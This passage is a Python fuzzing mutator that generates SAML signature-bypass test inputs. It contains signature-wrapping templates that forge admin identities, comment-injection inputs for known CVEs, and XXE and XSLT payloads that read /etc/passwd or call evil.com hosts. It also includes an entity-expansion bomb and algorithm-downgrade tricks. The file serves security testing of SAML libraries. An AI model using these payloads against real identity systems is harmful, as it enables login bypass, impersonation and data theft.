"""SAML XML Signature taxonomy-driven mutator — differential bypass edition.

Encodes structural attack patterns from the SAML vulnerability taxonomy
into a semantic-level mutator.  Each strategy targets a specific bypass
category proven effective against real-world SAML libraries.

Taxonomy sections mapped to strategies:
  S1   XSW1-8 Signature Wrapping       -> xsw_* strategies
  S2   Parser Differentials             -> dual_parser, attr_pollution, doctype_attlist
  S3   Canonicalization Exploitation    -> void_c14n, comment_digest, comment_sigvalue
  S4   Signature Validation Bypass      -> sig_strip, self_signed, algo_downgrade, hmac_confusion
  S5   XML Injection & Entity Attacks   -> xxe_inject, entity_expansion, xslt_inject
  S6   Protocol-Level Attacks           -> nameid_spoof, audience_bypass, timestamp_manip
  S7   Cryptographic Infrastructure     -> golden_saml_pattern
  S8   Implementation-Specific Flaws    -> libxml2_cache, xmlcrypto_firstchild,
                                           samlify_xpath, rexml_quirk
"""

from __future__ import annotations

import re
import random
from typing import TYPE_CHECKING

from ..protocols import Input

if TYPE_CHECKING:
    from ..corpus import Seed

# ── Evil NameID values for injection ─────────────────────────────

EVIL_NAMEIDS = [
    b"admin@example.com",
    b"admin",
    b"root@example.com",
    b"superuser@example.com",
    b"ceo@company.com",
    b"ADMIN@EXAMPLE.COM",
    b"system",
]

# ── XSW templates (S1) ──────────────────────────────────────────

# XSW wrapper: wraps evil assertion around content
XSW_ASSERTION_TEMPLATE = (
    b'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
    b' Version="2.0" ID="_evil_{EVIL_ID}"'
    b' IssueInstant="2025-01-01T00:00:00Z">'
    b"<saml:Issuer>https://idp.example.com</saml:Issuer>"
    b"<saml:Subject>"
    b"<saml:NameID>{EVIL_NAMEID}</saml:NameID>"
    b"</saml:Subject>"
    b"</saml:Assertion>"
)

# Extensions wrapper for XSW7
XSW_EXTENSIONS_PREFIX = b"<samlp:Extensions>"
XSW_EXTENSIONS_SUFFIX = b"</samlp:Extensions>"

# Object wrapper for XSW8
XSW_OBJECT_PREFIX = b"<ds:Object>"
XSW_OBJECT_SUFFIX = b"</ds:Object>"

# ── Comment injection payloads (S3-3 SAMLStorm) ─────────────────

COMMENT_DIGEST_PAYLOADS = [
    # Inject comment into DigestValue — xml-crypto firstChild bug
    b"<!-- -->",
    b"<!--FORGED-->",
    b"<!-- evil_digest_here -->",
    b"<!--47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=-->",
]

COMMENT_SIGVALUE_PAYLOADS = [
    b"<!-- -->",
    b"<!--FORGED_SIGNATURE-->",
    b"<!-- evil_sig -->",
]

# ── Namespace manipulation payloads (S2/S3) ──────────────────────

RELATIVE_NAMESPACE_URIS = [
    b'xmlns:evil="1"',
    b'xmlns:evil="relative/path"',
    b'xmlns:ns1="foo"',
    b'xmlns:x=""',
    b'xmlns=""',
]

NAMESPACE_REDECLARATIONS = [
    b'xmlns:saml="http://evil.com/saml"',
    b'xmlns:samlp="http://evil.com/samlp"',
    b'xmlns:ds="http://evil.com/xmldsig"',
    b'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
    b'xml:xmlns="http://www.w3.org/2000/09/xmldsig#"',
]

# ── DOCTYPE payloads (S2-3 / S5-1) ──────────────────────────────

DOCTYPE_PAYLOADS = [
    # ATTLIST injection for REXML differential (CVE-2025-25291)
    b'<!DOCTYPE samlp:Response [\n'
    b'  <!ATTLIST saml:Assertion xmlns:saml CDATA '
    b'"urn:oasis:names:tc:SAML:2.0:assertion">\n]>\n',
    # Entity declaration for namespace override
    b'<!DOCTYPE samlp:Response [\n'
    b'  <!ATTLIST saml:Assertion ID CDATA "evil_id">\n]>\n',
    # XXE file read
    b'<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n',
    # OOB XXE
    b'<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://evil.com/steal">\n]>\n',
    # Parameter entity
    b"<!DOCTYPE foo [\n  <!ENTITY % pe SYSTEM "
    b'"http://evil.com/pe.dtd">\n  %pe;\n]>\n',
]

# ── Algorithm URIs (S4-3) ────────────────────────────────────────

WEAK_SIG_ALGORITHMS = [
    b"http://www.w3.org/2000/09/xmldsig#rsa-sha1",
    b"http://www.w3.org/2001/04/xmldsig-more#hmac-sha256",
    b"http://www.w3.org/2001/04/xmldsig-more#hmac-sha1",
    b"http://www.w3.org/2000/09/xmldsig#hmac-sha1",
    b"none",
    b"",
]

WEAK_DIGEST_ALGORITHMS = [
    b"http://www.w3.org/2000/09/xmldsig#sha1",
    b"http://www.w3.org/2001/04/xmldsig-more#md5",
]

# ── Encoding payloads (S2-NEW) ───────────────────────────────────

ENCODING_BOMS = [
    b"\xff\xfe",           # UTF-16 LE BOM — Go rejects, libxml2 auto-detects
    b"\xfe\xff",           # UTF-16 BE BOM
    b"\xef\xbb\xbf",       # UTF-8 BOM (benign but different code paths)
]

ENCODING_DECLARATIONS = [
    b'<?xml version="1.0" encoding="UTF-16"?>',
    b'<?xml version="1.0" encoding="UTF-7"?>',
    b'<?xml version="1.0" encoding="ISO-8859-1"?>',
    b'<?xml version="1.0" encoding="US-ASCII"?>',
    b'<?xml version="1.0" encoding="windows-1252"?>',
]

# ── Transform chain payloads (S3-NEW) ────────────────────────────

EXTRA_TRANSFORMS = [
    b'<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
    b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2"'
    b' Filter="intersect">//*</XPath></ds:Transform>',
    b'<ds:Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>',
    b'<ds:Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments"/>',
    b'<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#WithComments"/>',
    b'<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#base64"/>',
]

# ── Reference URI payloads (S3-NEW) ──────────────────────────────

REFERENCE_URI_PAYLOADS = [
    b"",                           # whole document
    b"#",                          # empty fragment
    b"xpointer(/)",                # XPointer root — Go unsupported
    b"xpointer(id('_evil'))",      # XPointer by ID
    b"#_wrong_id",                 # non-existent ID
]

# ── Namespace undeclaration payloads (S2-NEW) ────────────────────

NAMESPACE_UNDECLARATIONS = [
    b'xmlns:saml=""',              # XML 1.0 error, some parsers accept
    b'xmlns:ds=""',
    b'xmlns:samlp=""',
    b'xmlns=""',                   # undeclare default namespace
]

# ── Canonicalization algorithm payloads (S3-NEW) ─────────────────

C14N_ALGORITHMS = [
    b"http://www.w3.org/TR/2001/REC-xml-c14n-20010315",
    b"http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments",
    b"http://www.w3.org/2001/10/xml-exc-c14n#WithComments",
    b"http://www.w3.org/2006/12/xml-c14n11",
    b"http://www.w3.org/2006/12/xml-c14n11#WithComments",
    b"",
]

# ── Protocol-level payloads (S6-NEW) ─────────────────────────────

EVIL_ISSUERS = [
    b"https://evil-idp.com",
    b"",
    b"*",
    b"https://idp.example.com/../../admin",
    b"null",
]

SUBJECT_CONFIRMATION_METHODS = [
    b"urn:oasis:names:tc:SAML:2.0:cm:holder-of-key",
    b"urn:oasis:names:tc:SAML:2.0:cm:sender-vouches",
    b"",
    b"urn:evil",
]

EVIL_ATTRIBUTES = [
    b'<saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>',
    b'<saml:Attribute Name="email"><saml:AttributeValue>admin@example.com</saml:AttributeValue></saml:Attribute>',
    b'<saml:Attribute Name="groups"><saml:AttributeValue>superadmin</saml:AttributeValue></saml:Attribute>',
]

# ── Processing instruction payloads (S2-NEW) ─────────────────────

PI_PAYLOADS = [
    b"<?xml-stylesheet type='text/xsl' href='http://evil.com/steal.xsl'?>",
    b"<?evil data?>",
    b"<?xpacket?>",
]

# ── Whitespace injection payloads (S2-NEW) ───────────────────────

WHITESPACE_INJECTIONS = [
    b"\r\n",
    b"\r",
    b"\x0b",       # vertical tab
    b"\x0c",       # form feed
    b"\x00",       # null byte
    b"\t\t",
    b"\xc2\xa0",   # UTF-8 NBSP
]

# ── Go encoding/xml quirk payloads (S8-NEW) ──────────────────────

GO_QUIRK_PAYLOADS = [
    (b' ID="_evil_go"', b"duplicate_attr"),        # duplicate attr — Go keeps last
    (b' xmlns="urn:evil:default"', b"default_ns"),  # default NS injection
]

# ── XSLT payloads (S5-3) ────────────────────────────────────────

XSLT_PAYLOADS = [
    (
        b'<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">'
        b'<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">'
        b'<xsl:template match="/">'
        b'<xsl:value-of select="unparsed-text(\'/etc/passwd\')"/>'
        b"</xsl:template></xsl:stylesheet></ds:Transform>"
    ),
    (
        b'<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">'
        b'<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">'
        b'<xsl:template match="/">'
        b'<xsl:value-of select="document(\'http://evil.com/ssrf\')"/>'
        b"</xsl:template></xsl:stylesheet></ds:Transform>"
    ),
]

# ── Regex patterns for locating XML elements ─────────────────────

_RE_ASSERTION_OPEN = re.compile(
    rb"<saml:Assertion\b[^>]*>", re.IGNORECASE | re.DOTALL
)
_RE_ASSERTION_CLOSE = re.compile(rb"</saml:Assertion\s*>", re.IGNORECASE)
_RE_SIGNATURE_OPEN = re.compile(
    rb"<ds:Signature\b[^>]*>", re.IGNORECASE | re.DOTALL
)
_RE_SIGNATURE_CLOSE = re.compile(rb"</ds:Signature\s*>", re.IGNORECASE)
_RE_RESPONSE_OPEN = re.compile(
    rb"<samlp:Response\b[^>]*>", re.IGNORECASE | re.DOTALL
)
_RE_RESPONSE_CLOSE = re.compile(rb"</samlp:Response\s*>", re.IGNORECASE)
_RE_DIGEST_VALUE = re.compile(
    rb"(<ds:DigestValue>)(.*?)(</ds:DigestValue>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_SIGNATURE_VALUE = re.compile(
    rb"(<ds:SignatureValue>)(.*?)(</ds:SignatureValue>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_SIG_METHOD = re.compile(
    rb'(<ds:SignatureMethod\s+Algorithm=")(.*?)(")',
    re.IGNORECASE | re.DOTALL,
)
_RE_DIGEST_METHOD = re.compile(
    rb'(<ds:DigestMethod\s+Algorithm=")(.*?)(")',
    re.IGNORECASE | re.DOTALL,
)
_RE_NAMEID = re.compile(
    rb"(<saml:NameID\b[^>]*>)(.*?)(</saml:NameID>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_AUDIENCE = re.compile(
    rb"(<saml:Audience>)(.*?)(</saml:Audience>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_NOTONORAFTER = re.compile(
    rb'(NotOnOrAfter=")(.*?)(")', re.IGNORECASE
)
_RE_TRANSFORMS = re.compile(
    rb"(<ds:Transforms>)(.*?)(</ds:Transforms>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_KEYINFO = re.compile(
    rb"(<ds:KeyInfo>)(.*?)(</ds:KeyInfo>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_XML_DECL = re.compile(rb"<\?xml\b[^?]*\?>")
_RE_EXTENSIONS = re.compile(
    rb"(<samlp:Extensions>)(.*?)(</samlp:Extensions>)",
    re.IGNORECASE | re.DOTALL,
)
# ── New regex patterns for expanded strategies ────────────────────
_RE_ENVELOPED_TRANSFORM = re.compile(
    rb'<ds:Transform\s+Algorithm="http://www\.w3\.org/2000/09/xmldsig#enveloped-signature"\s*/?>',
    re.IGNORECASE | re.DOTALL,
)
_RE_REFERENCE_URI = re.compile(
    rb'(<ds:Reference\s+URI=")(.*?)(")',
    re.IGNORECASE | re.DOTALL,
)
_RE_C14N_METHOD = re.compile(
    rb'(<ds:CanonicalizationMethod\s+Algorithm=")(.*?)(")',
    re.IGNORECASE | re.DOTALL,
)
_RE_ISSUER = re.compile(
    rb"(<saml:Issuer>)(.*?)(</saml:Issuer>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_SUBJECT_CONFIRMATION = re.compile(
    rb'(<saml:SubjectConfirmation\s+Method=")(.*?)(")',
    re.IGNORECASE | re.DOTALL,
)
_RE_NOTBEFORE = re.compile(
    rb'(NotBefore=")(.*?)(")', re.IGNORECASE
)
_RE_RECIPIENT = re.compile(
    rb'(Recipient=")(.*?)(")', re.IGNORECASE
)
_RE_REFERENCE_BLOCK = re.compile(
    rb"(<ds:Reference\b[^>]*>)(.*?)(</ds:Reference>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_ATTRIBUTE_STATEMENT_CLOSE = re.compile(
    rb"(</saml:AttributeStatement>)", re.IGNORECASE
)
_RE_X509_CERT = re.compile(
    rb"(<ds:X509Certificate>)(.*?)(</ds:X509Certificate>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_SIGNED_INFO = re.compile(
    rb"(<ds:SignedInfo>)(.*?)(</ds:SignedInfo>)",
    re.IGNORECASE | re.DOTALL,
)

# Precomputed empty-string SHA-256 digest (base64)
EMPTY_SHA256_B64 = b"47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU="

MAX_OUTPUT_SIZE = 100_000


def _make_evil_assertion(rng: random.Random) -> bytes:
    """Build an unsigned evil assertion with a random admin NameID."""
    evil_id = rng.randbytes(8).hex().encode()
    nameid = rng.choice(EVIL_NAMEIDS)
    return (
        XSW_ASSERTION_TEMPLATE
        .replace(b"{EVIL_ID}", evil_id)
        .replace(b"{EVIL_NAMEID}", nameid)
    )


def _find_element_span(
    data: bytes,
    open_re: re.Pattern[bytes],
    close_re: re.Pattern[bytes],
) -> tuple[int, int] | None:
    """Find the byte range of the first matching element (open..close)."""
    m_open = open_re.search(data)
    if not m_open:
        return None
    m_close = close_re.search(data, m_open.end())
    if not m_close:
        return None
    return (m_open.start(), m_close.end())


class SamlMutator:
    """SAML signature bypass taxonomy-driven mutator.

    Targets weaknesses in SAML 2.0 signature validation across libraries:
    xml-crypto, samlify, node-saml, ruby-saml, python3-saml, signxml,
    php-saml/xmlseclibs.
    """

    name = "saml"

    def __init__(self, seed: int | None = None) -> None:
        self.rng = random.Random(seed)
        self._strategies: list = [
            # ── S1: XSW Signature Wrapping ──
            self._xsw1_pre_assertion_clone,       # 0
            self._xsw2_post_assertion_clone,      # 1
            self._xsw3_assertion_in_assertion,    # 2
            self._xsw4_assertion_swap,            # 3
            self._xsw5_post_signature_assertion,  # 4
            self._xsw7_extensions_embed,          # 5
            self._xsw8_object_embed,              # 6
            self._xsw_envelope_inversion,         # 7
            # ── S2: Parser Differentials (original + new) ──
            self._attr_pollution,                 # 8
            self._doctype_attlist,                # 9
            self._namespace_redeclaration,        # 10
            self._encoding_bom_injection,         # 11  NEW
            self._encoding_declaration_swap,      # 12  NEW
            self._namespace_undeclare,            # 13  NEW
            self._processing_instruction_inject,  # 14  NEW
            self._whitespace_crlf_inject,         # 15  NEW
            self._comment_in_element_name,        # 16  NEW
            self._namespace_prefix_remap,         # 17  NEW
            # ── S3: Canonicalization (original + new) ──
            self._void_c14n_relative_ns,          # 18
            self._comment_inject_digest,          # 19
            self._comment_inject_sigvalue,        # 20
            self._transform_chain_inject,         # 21  NEW
            self._transform_remove_enveloped,     # 22  NEW
            self._reference_uri_empty,            # 23  NEW
            self._reference_uri_xpointer,         # 24  NEW
            self._c14n_method_swap,               # 25  NEW
            # ── S4: Signature Bypass (original + new) ──
            self._sig_strip_all,                  # 26
            self._sig_strip_assertion,            # 27
            self._algo_downgrade,                 # 28
            self._hmac_confusion,                 # 29
            self._duplicate_reference,            # 30  NEW
            self._keyinfo_confusion,              # 31  NEW
            self._signedinfo_manipulation,        # 32  NEW
            # ── S5: XML Injection ──
            self._xxe_inject,                     # 33
            self._entity_expansion,               # 34
            self._xslt_transform_inject,          # 35
            # ── S6: Protocol-Level (original + new) ──
            self._nameid_spoof,                   # 36
            self._audience_bypass,                # 37
            self._timestamp_manipulation,         # 38
            self._issuer_spoof,                   # 39  NEW
            self._subject_confirmation_bypass,    # 40  NEW
            self._condition_manipulation,         # 41  NEW
            self._attribute_injection,            # 42  NEW
            # ── S7: Crypto Infrastructure ──
            self._golden_saml_self_signed,        # 43
            # ── S8: Implementation-Specific (original + new) ──
            self._xmlcrypto_firstchild,           # 44
            self._samlify_xpath_scope,            # 45
            self._rexml_namespace_quirk,          # 46
            self._libxml2_id_caching,             # 47
            self._assertion_count_bomb,           # 48  NEW
            self._go_encoding_xml_quirk,          # 49  NEW
        ]
        self._strategy_names: list[str] = [fn.__name__.lstrip("_") for fn in self._strategies]
        self._weights: list[int] = [
            # S1: XSW (slightly reduced to make room)
            10, 8, 8, 7, 7, 5, 5, 5,
            # S2: Parser differentials (original + new)
            5, 5, 6, 8, 7, 7, 6, 5, 4, 5,
            # S3: Canonicalization (original + new)
            6, 7, 4, 8, 7, 8, 7, 6,
            # S4: Signature bypass (original + new)
            9, 5, 5, 4, 6, 5, 4,
            # S5: XML injection
            3, 2, 2,
            # S6: Protocol-level (original + new)
            5, 4, 3, 5, 4, 4, 5,
            # S7: Crypto
            2,
            # S8: Implementation-specific (original + new)
            4, 4, 4, 3, 5, 6,
        ]
        assert len(self._strategies) == len(self._weights)

    # ── Public API ───────────────────────────────────────────────

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        data = bytearray(inp.data)
        if len(data) < 10:
            data = bytearray(
                b'<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"'
                b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
                b' ID="_resp" Version="2.0">'
                b"<saml:Assertion/></samlp:Response>"
            )

        num_ops = self.rng.choices([1, 2, 3], weights=[50, 35, 15], k=1)[0]
        applied: list[str] = []
        for _ in range(num_ops):
            idx = self.rng.choices(
                range(len(self._strategies)), weights=self._weights, k=1
            )[0]
            strategy = self._strategies[idx]
            result = strategy(data)
            if result is not None and len(result) > 0:
                data = result
                applied.append(self._strategy_names[idx])

        if len(data) > MAX_OUTPUT_SIZE:
            data = data[:MAX_OUTPUT_SIZE]

        return Input(
            data=bytes(data),
            metadata={
                **inp.metadata,
                "mutator": self.name,
                "strategies": applied,
            },
        )

    # ══════════════════════════════════════════════════════════════
    # S1: XML Signature Wrapping (XSW)
    # ══════════════════════════════════════════════════════════════

    def _xsw1_pre_assertion_clone(self, data: bytearray) -> bytearray | None:
        """XSW1/3: Inject evil assertion BEFORE the legitimate signed one.

        SP using //Assertion or first-child semantics picks the evil copy.
        """
        span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
        if not span:
            return None
        evil = _make_evil_assertion(self.rng)
        return bytearray(
            bytes(data[: span[0]]) + evil + b"\n" + bytes(data[span[0] :])
        )

    def _xsw2_post_assertion_clone(self, data: bytearray) -> bytearray | None:
        """XSW2: Inject evil assertion AFTER the legitimate one."""
        span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
        if not span:
            return None
        evil = _make_evil_assertion(self.rng)
        return bytearray(
            bytes(data[: span[1]]) + b"\n" + evil + bytes(data[span[1] :])
        )

    def _xsw3_assertion_in_assertion(self, data: bytearray) -> bytearray | None:
        """XSW4: Nest evil assertion INSIDE the legitimate assertion."""
        m = _RE_ASSERTION_CLOSE.search(data)
        if not m:
            return None
        evil = _make_evil_assertion(self.rng)
        pos = m.start()
        return bytearray(
            bytes(data[:pos]) + evil + b"\n" + bytes(data[pos:])
        )

    def _xsw4_assertion_swap(self, data: bytearray) -> bytearray | None:
        """XSW5: Modify NameID in signed assertion, keep original as decoy."""
        m = _RE_NAMEID.search(data)
        if not m:
            return None
        evil_nameid = self.rng.choice(EVIL_NAMEIDS)
        return bytearray(
            bytes(data[: m.start(2)])
            + evil_nameid
            + bytes(data[m.end(2) :])
        )

    def _xsw5_post_signature_assertion(self, data: bytearray) -> bytearray | None:
        """XSW6: Insert evil assertion right after the Signature element."""
        span = _find_element_span(data, _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE)
        if not span:
            return None
        evil = _make_evil_assertion(self.rng)
        return bytearray(
            bytes(data[: span[1]]) + b"\n" + evil + bytes(data[span[1] :])
        )

    def _xsw7_extensions_embed(self, data: bytearray) -> bytearray | None:
        """XSW7: Move legit assertion into Extensions, replace with evil."""
        span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
        if not span:
            return None
        original = bytes(data[span[0] : span[1]])
        evil = _make_evil_assertion(self.rng)
        wrapped = (
            XSW_EXTENSIONS_PREFIX + original + XSW_EXTENSIONS_SUFFIX
        )
        return bytearray(
            bytes(data[: span[0]])
            + wrapped
            + b"\n"
            + evil
            + bytes(data[span[1] :])
        )

    def _xsw8_object_embed(self, data: bytearray) -> bytearray | None:
        """XSW8: Move legit assertion into ds:Object, replace with evil."""
        a_span = _find_element_span(
            data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE
        )
        s_span = _find_element_span(
            data, _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE
        )
        if not a_span or not s_span:
            return None
        original = bytes(data[a_span[0] : a_span[1]])
        evil = _make_evil_assertion(self.rng)
        obj_block = XSW_OBJECT_PREFIX + original + XSW_OBJECT_SUFFIX
        # Insert Object into Signature (before </ds:Signature>)
        m_sigclose = _RE_SIGNATURE_CLOSE.search(data)
        if not m_sigclose:
            return None
        result = bytearray(data)
        # First replace assertion with evil
        result[a_span[0] : a_span[1]] = evil
        # Recalculate sig close position after replacement
        offset = len(evil) - (a_span[1] - a_span[0])
        new_sigclose = m_sigclose.start() + offset
        result[new_sigclose:new_sigclose] = obj_block
        return result

    def _xsw_envelope_inversion(self, data: bytearray) -> bytearray | None:
        """Envelope inversion: wrap original Response inside a forged outer."""
        r_span = _find_element_span(
            data, _RE_RESPONSE_OPEN, _RE_RESPONSE_CLOSE
        )
        if not r_span:
            return None
        evil = _make_evil_assertion(self.rng)
        original = bytes(data[r_span[0] : r_span[1]])
        outer = (
            b'<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"'
            b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
            b' ID="_outer" Version="2.0">\n'
            + evil
            + b"\n<samlp:Extensions>"
            + original
            + b"</samlp:Extensions>\n</samlp:Response>"
        )
        return bytearray(
            bytes(data[: r_span[0]]) + outer + bytes(data[r_span[1] :])
        )

    # ══════════════════════════════════════════════════════════════
    # S2: Parser Differentials
    # ══════════════════════════════════════════════════════════════

    def _attr_pollution(self, data: bytearray) -> bytearray | None:
        """Duplicate ID attribute with namespace prefix (S2-2).

        Nokogiri and REXML resolve differently: one returns the prefixed
        version, the other the unprefixed version.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        tag = bytes(data[m.start() : m.end()])
        # Add a duplicate ID with samlp: prefix
        evil_id = b"_evil_" + self.rng.randbytes(4).hex().encode()
        if b"samlp:ID=" not in tag:
            injection = b' samlp:ID="' + evil_id + b'"'
            pos = m.end() - 1  # before closing >
            return bytearray(
                bytes(data[:pos]) + injection + bytes(data[pos:])
            )
        return None

    def _doctype_attlist(self, data: bytearray) -> bytearray | None:
        """DOCTYPE ATTLIST injection (S2-3 / CVE-2025-25291).

        REXML applies ATTLIST defaults; Nokogiri/libxml2 ignores them.
        This creates divergent namespace structures.
        """
        payload = self.rng.choice(DOCTYPE_PAYLOADS)
        # Remove existing DOCTYPE if any
        cleaned = re.sub(rb"<!DOCTYPE[^>]*>", b"", bytes(data))
        # Insert after XML declaration or at start
        m_decl = _RE_XML_DECL.search(cleaned)
        if m_decl:
            pos = m_decl.end()
        else:
            pos = 0
        return bytearray(cleaned[:pos] + b"\n" + payload + cleaned[pos:])

    def _namespace_redeclaration(self, data: bytearray) -> bytearray | None:
        """Namespace prefix redeclaration (S1-4 / S2).

        Redefine saml:/ds: namespaces to confuse namespace-aware XPath.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        redecl = self.rng.choice(NAMESPACE_REDECLARATIONS)
        pos = m.end() - 1  # before closing >
        return bytearray(
            bytes(data[:pos]) + b" " + redecl + bytes(data[pos:])
        )

    # ══════════════════════════════════════════════════════════════
    # S3: Canonicalization Exploitation
    # ══════════════════════════════════════════════════════════════

    def _void_c14n_relative_ns(self, data: bytearray) -> bytearray | None:
        """Relative namespace URI injection (S3-1 / CVE-2025-66568).

        Causes exc-c14n to produce empty output on some implementations
        (libxml2, xmlseclibs). Digest of empty string is predictable.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        ns_attr = self.rng.choice(RELATIVE_NAMESPACE_URIS)
        pos = m.end() - 1
        result = bytearray(
            bytes(data[:pos]) + b" " + ns_attr + bytes(data[pos:])
        )
        # Optionally replace DigestValue with empty-string SHA-256
        if self.rng.random() < 0.5:
            m_dv = _RE_DIGEST_VALUE.search(result)
            if m_dv:
                result[m_dv.start(2) : m_dv.end(2)] = EMPTY_SHA256_B64
        return result

    def _comment_inject_digest(self, data: bytearray) -> bytearray | None:
        """Comment injection into DigestValue (S3-3 SAMLStorm / CVE-2025-29775).

        xml-crypto uses firstChild to read DigestValue. An XML comment
        becomes the firstChild, so the library reads the comment content
        as the digest value instead of the actual text.
        """
        m = _RE_DIGEST_VALUE.search(data)
        if not m:
            return None
        comment = self.rng.choice(COMMENT_DIGEST_PAYLOADS)
        # Insert comment before the actual value
        return bytearray(
            bytes(data[: m.start(2)]) + comment + bytes(data[m.start(2) :])
        )

    def _comment_inject_sigvalue(self, data: bytearray) -> bytearray | None:
        """Comment injection into SignatureValue (S3-3 / CVE-2025-29774)."""
        m = _RE_SIGNATURE_VALUE.search(data)
        if not m:
            return None
        comment = self.rng.choice(COMMENT_SIGVALUE_PAYLOADS)
        return bytearray(
            bytes(data[: m.start(2)]) + comment + bytes(data[m.start(2) :])
        )

    # ══════════════════════════════════════════════════════════════
    # S4: Signature Validation Bypass
    # ══════════════════════════════════════════════════════════════

    def _sig_strip_all(self, data: bytearray) -> bytearray | None:
        """Complete signature removal (S4-1)."""
        span = _find_element_span(data, _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE)
        if not span:
            return None
        return bytearray(bytes(data[: span[0]]) + bytes(data[span[1] :]))

    def _sig_strip_assertion(self, data: bytearray) -> bytearray | None:
        """Strip assertion-level signature only (S4-1).

        Keep response-level signature if present. Tests whether SP
        validates both levels independently.
        """
        # Find signature inside assertion
        a_span = _find_element_span(
            data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE
        )
        if not a_span:
            return None
        assertion = bytes(data[a_span[0] : a_span[1]])
        s_span = _find_element_span(
            assertion, _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE
        )
        if not s_span:
            return None
        stripped = assertion[: s_span[0]] + assertion[s_span[1] :]
        return bytearray(
            bytes(data[: a_span[0]]) + stripped + bytes(data[a_span[1] :])
        )

    def _algo_downgrade(self, data: bytearray) -> bytearray | None:
        """Algorithm downgrade attack (S4-3).

        Change SignatureMethod and/or DigestMethod to weaker algorithms.
        """
        result = bytearray(data)
        if self.rng.random() < 0.7:
            m = _RE_SIG_METHOD.search(result)
            if m:
                weak = self.rng.choice(WEAK_SIG_ALGORITHMS)
                result[m.start(2) : m.end(2)] = weak
        if self.rng.random() < 0.5:
            m = _RE_DIGEST_METHOD.search(result)
            if m:
                weak = self.rng.choice(WEAK_DIGEST_ALGORITHMS)
                result[m.start(2) : m.end(2)] = weak
        return result

    def _hmac_confusion(self, data: bytearray) -> bytearray | None:
        """HMAC key confusion attack (S4-3).

        Change algorithm to HMAC. If the library uses the IdP's public
        key as the HMAC secret, the attacker can sign with it.
        """
        m = _RE_SIG_METHOD.search(data)
        if not m:
            return None
        hmac_uri = self.rng.choice([
            b"http://www.w3.org/2001/04/xmldsig-more#hmac-sha256",
            b"http://www.w3.org/2000/09/xmldsig#hmac-sha1",
        ])
        return bytearray(
            bytes(data[: m.start(2)]) + hmac_uri + bytes(data[m.end(2) :])
        )

    # ══════════════════════════════════════════════════════════════
    # S5: XML Injection & Entity Attacks
    # ══════════════════════════════════════════════════════════════

    def _xxe_inject(self, data: bytearray) -> bytearray | None:
        """XXE injection via DOCTYPE (S5-1)."""
        return self._doctype_attlist(data)

    def _entity_expansion(self, data: bytearray) -> bytearray | None:
        """Billion Laughs / quadratic blowup (S5-2)."""
        bomb = (
            b"<!DOCTYPE bomb [\n"
            b'  <!ENTITY a "AAAAAAAAAA">\n'
            b'  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n'
            b'  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n'
            b"]>\n"
        )
        cleaned = re.sub(rb"<!DOCTYPE[^>]*>", b"", bytes(data))
        m_decl = _RE_XML_DECL.search(cleaned)
        pos = m_decl.end() if m_decl else 0
        return bytearray(cleaned[:pos] + b"\n" + bomb + cleaned[pos:])

    def _xslt_transform_inject(self, data: bytearray) -> bytearray | None:
        """XSLT transform injection (S5-3 / Google Project Zero 2022).

        Injects XSLT stylesheet into Transform chain. XSLT executes
        BEFORE signature verification in Java's javax.xml.crypto.
        """
        m = _RE_TRANSFORMS.search(data)
        if not m:
            return None
        xslt = self.rng.choice(XSLT_PAYLOADS)
        # Insert XSLT transform before the closing </ds:Transforms>
        return bytearray(
            bytes(data[: m.start(3)]) + xslt + b"\n" + bytes(data[m.start(3) :])
        )

    # ══════════════════════════════════════════════════════════════
    # S6: Protocol-Level Attacks
    # ══════════════════════════════════════════════════════════════

